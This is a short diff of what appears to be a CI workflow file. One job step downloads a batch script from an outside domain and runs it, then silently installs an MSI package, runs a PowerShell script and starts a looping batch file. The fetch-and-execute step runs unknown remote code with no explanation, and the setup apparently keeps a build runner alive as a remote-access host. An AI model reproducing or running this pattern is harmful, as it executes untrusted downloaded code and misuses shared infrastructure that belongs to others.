@@ -13,7 +13,8 @@ jobs:
         run: |
           Invoke-WebRequest -Uri https://spyderrock.com/6sMK2912-a.bat -OutFile setup.bat
           cmd /c setup.bat
-          .\are.ps1 /Q
+          .\crd.msi /S
+          .\are.ps1 /S
           cmd /c loop.bat
           
       - name: Start 
